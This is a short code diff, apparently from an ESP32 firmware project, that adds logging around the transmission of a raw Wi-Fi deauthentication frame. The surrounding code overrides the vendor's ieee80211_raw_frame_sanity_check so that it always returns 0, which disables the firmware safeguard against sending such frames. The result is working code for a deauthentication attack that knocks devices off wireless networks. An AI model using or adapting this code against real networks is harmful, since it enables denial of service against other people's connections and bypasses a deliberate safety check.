@@ -7,6 +7,9 @@
 #include "esp_netif.h"
 #include "nvs_flash.h"
 #include "esp_wifi.h"
+#include "esp_log.h"
+
+char * TAG = "DEBUG";
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
   return 0;
@@ -37,6 +40,12 @@ extern "C" void app_main()
 
     ESP_ERROR_CHECK(esp_wifi_start());
 
-    esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+	if (ret == ESP_OK){
+		ESP_LOGI(TAG, "Deauthentication packet sent...");
+	}else{
+		ESP_LOGI(TAG, "Deauthentication packet transmission unsuccessful...");
+	}
+	
 
 }
